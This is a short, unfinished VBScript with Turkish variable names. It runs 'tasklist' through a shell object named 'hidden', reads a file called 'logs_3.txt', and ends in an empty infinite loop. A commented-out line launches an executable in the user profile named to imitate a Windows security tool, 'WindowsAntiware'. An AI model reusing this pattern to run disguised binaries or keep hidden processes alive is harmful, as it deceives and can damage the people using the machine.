Dim okunacakdosya, icerik, dosyaokuyucu

set gizli = WScript.CreateObject("WScript.Shell")
Set dosyaokuyucu = CreateObject("Scripting.FileSystemObject")
Set okunacakdosya = dosyaokuyucu.OpenTextFile("logs_3.txt", 1)

Set islem = gizli.Exec("cmd /C tasklist")
'Do While islem.Status = 0
    'WScript.Sleep 100
'Loop
'MsgBox("tamam")

icerik = okunacakdosya.ReadAll

'Set islem_2 = gizli.Exec("cmd %USERPROFILE%\WindowsAntiware\WindowsAntiwareC.exe -g")

While 0 < 1
    
Wend

